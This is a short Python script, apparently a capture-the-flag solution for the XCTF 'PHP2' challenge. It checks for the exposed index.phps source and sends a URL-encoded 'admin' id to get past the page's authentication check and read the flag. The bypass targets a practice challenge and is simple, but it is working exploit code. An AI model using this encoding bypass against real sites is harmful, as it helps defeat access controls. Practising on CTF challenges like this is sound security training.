# -*- coding:utf-8 -*-
# name: Meng
# mail: 614886708@qq.com
# ctf_poc02: XCTF PHP2

import requests
import re


class PostUrl:
    def __init__(self, url):
        # 对输入的url做补全
        if url.endswith('index.php') or url.endswith('index.php/'):
            self.url = url
        elif url.endswith('/'):
            self.url = url + 'index.php'
        else:
            self.url = url + '/index.php'

        self.data = {'id': '%61%64%6d%69%6e'}   # 需要传递的数据
        self.flag = ''    # 最终flag

    def get_flag(self):
        r = requests.get(self.url)

        # 判断返回页面内容
        if 'Can you anthenticate to this website?' in r.text:
            r = requests.get(self.url + 's')
            if '<?php' in r.text:
                r = requests.get(self.url, params=self.data)

        # 过滤返回内容
        try:
            self.flag = re.search(r'cyberpeace\{.+\}', r.text).group()
        except AttributeError:
            print('未发现flag!')

        return self.flag


if __name__ == '__main__':
    print('ctf_poc02: XCTF PHP2')
    url = input('请输入题目链接：')
    flag = PostUrl(url).get_flag()
    print(flag)
